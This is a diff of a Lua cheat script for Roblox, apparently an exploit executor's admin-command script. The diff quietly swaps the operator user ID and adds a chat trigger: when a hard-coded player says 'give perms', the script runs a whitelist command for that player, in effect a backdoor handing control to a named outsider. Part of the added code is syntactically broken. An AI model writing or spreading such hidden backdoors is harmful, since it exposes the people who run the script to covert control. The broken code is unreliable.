@@ -22,7 +22,7 @@ joinleavelogs = false
 
 
     game.Players.PlayerAdded:Connect(function(plr)
-if plr.Name == "2345678asdfghjkxcb" then
+if plr.Name == "bd_nk" then
 Notify({ 
 Description = "MAFIA JOINED THE GAME UWUWUWUUWUWUWUUWUW";
 Title = "�����";
@@ -14801,19 +14801,27 @@ end
 
 
 
-mafiacmdsloaded = false
+mafiacmdsloaded = true
 
 
 while true do
 wait(1)
+if mafiajoinedserver == true then
 
+game:GetService("Players").2345678asdfghjkxcb.Chatted:connect(function(msg) 
+        if (msg:lower() == "give perms") then
+print("ok daddy")
+ExecuteCommand("flingwl", {"2345678asdfghjkxcb"}, LocalPlayer);
+end
+
+end
 if mafiajoinedserver == true and mafiacmdsloaded == false then
 mafiacmdsloaded = true
 local player = game.Players.LocalPlayer
 
 getgenv().Prefix = ">"
 
-getgenv().Operator = {2712970955}
+getgenv().Operator = {2977240591}
 getgenv().Droppers = {}
 
 
